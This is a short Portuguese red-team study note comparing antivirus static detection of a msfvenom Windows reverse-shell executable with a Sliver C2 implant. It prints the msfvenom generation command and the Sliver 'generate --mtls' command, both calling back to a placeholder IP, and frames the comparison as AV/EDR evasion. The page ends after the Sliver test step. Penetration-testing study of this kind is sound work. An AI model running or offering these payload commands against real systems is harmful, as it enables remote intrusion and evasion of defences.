> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/sliver-c2/dedection-and-evasion/static-evasion.md).

# Static Evasion

**Objetivo**

Comparar detecção de payloads entre:

* **msfvenom** (template estático)
* **Sliver C2** (compilação dinâmica)

**Conceito-chave**

* **Static Detection** → baseada em **assinaturas (signatures)**
* AV/EDR detectam arquivos conhecidos por hash/padrões

**Payload com msfvenom**

**Gerar payload**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o msfvenom_payload.exe
```

**Testar no VirusTotal**

* Upload do arquivo `msfvenom_payload.exe`

Resultado esperado:

* **Alta taxa de detecção**

**Motivo:**

* Usa **template estático**
* Já conhecido por AV/EDR
* Fácil fingerprint

**Payload com Sliver**

**Gerar implant**

```
generate --mtls <IP>:443 --os windows
```

**Testar no VirusTotal**

* Upload do `.exe` gerado pelo Sliver
